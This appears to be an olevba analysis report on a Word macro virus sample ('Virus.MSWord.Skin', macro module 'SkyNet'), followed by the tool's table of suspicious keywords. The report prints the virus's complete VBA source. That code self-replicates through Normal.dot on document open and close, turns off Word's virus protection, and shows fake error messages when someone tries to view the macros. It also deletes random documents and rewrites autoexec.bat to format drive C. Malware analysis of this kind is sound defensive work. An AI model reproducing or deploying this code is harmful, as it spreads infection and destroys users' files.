olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Skin-517cc3e1a03d3ab28454117592d3e44a8d499796
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Skin-517cc3e1a03d3ab28454117592d3e44a8d499796 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SkyNet.bas 
in file: Virus.MSWord.Skin-517cc3e1a03d3ab28454117592d3e44a8d499796 - OLE stream: 'Macros/VBA/SkyNet'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub ViewVBcode()
    a = MsgBox("No se pudo encontrar o iniciar Microsoft Visual Basic.", vbExclamation)
End Sub
Sub HerramMacro()
    a = MsgBox("No se pudo encontrar o iniciar Visor de Macros.", vbExclamation)
End Sub
Sub Accion()
On Error Resume Next
If Year(Date) > 1999 Or Month(Date) > 10 Then
 If Hour(Time) > 19 Then
  Application.FileSearch.SearchSubFolders = True
  Application.FileSearch.LookIn = Application.Options.DefaultFilePath(wdDocumentsPath)
  Application.FileSearch.FileType = msoFileTypeWordDocuments
  a = Application.FileSearch.Execute(msoSortByFileName, msoSortOrderAscending, True)
  t = Int(Rnd * a) + 1
  f$ = Application.FileSearch.FoundFiles(t)
  SetAttr f$, vbNormal
  Open f$ For Output As #1: Close #1
  Kill f$
 End If
End If
If Year(Date) > 1999 Then
 If Day(Date) = 18 Then
  If Hour(Time) > 19 Then
   f$ = "C:\autoexec.bat"
   SetAttr f$, vbNormal
   Open f$ For Output As #1
   Print #1, "PATH=C:\DOS;C:\WINDOWS\COMMAND;C:\WIN95\COMMAND;C:\WIN98\COMMAND\"
   Print #1, "echo s | format c:/q/V:SkyNet >nul"
   Close #1
  End If
 End If
End If
End Sub
Sub AutoClose()
On Error Resume Next
Call SkyNet
End Sub
Sub AutoOpen()
On Error Resume Next
Call SkyNet
End Sub

Sub AutoExec()
On Error Resume Next
Call Accion
End Sub
Sub SkyNet()
Attribute SkyNet.VB_Description = "Macro creada el 18/09/99 por DesMan"
Attribute SkyNet.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.SkyNet"
On Error Resume Next

Dim InfD As Boolean
Dim InfT As Boolean
Dim I
'CommandBars("tools").Controls("Macro").Delete
'CommandBars("tools").Controls("Plantillas y complementos...").Delete
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone

ActiveDocument.ReadOnlyRecommended = False

InfD = False: InfT = False
For I = 1 To ActiveDocument.VBProject.vBComponents.Count
 If ActiveDocument.VBProject.vBComponents(I).Name = "SkyNet" Then InfD = True
Next

For I = 1 To NormalTemplate.VBProject.vBComponents.Count
 If NormalTemplate.VBProject.vBComponents(I).Name = "SkyNet" Then InfT = True
Next

If InfD = False Then
 WordBasic.MacroCopy "Normal:SkyNet", WordBasic.[FileName$]() + ":SkyNet"
 If NormalTemplate.Saved = False Then NormalTemplate.Save
 NormalTemplate.Saved = True
End If

If InfT = False Then
 WordBasic.MacroCopy WordBasic.[FileName$]() + ":SkyNet", "Normal:SkyNet"
 If ActiveDocument.Saved = False Then ActiveDocument.Save
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|COMMAND             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

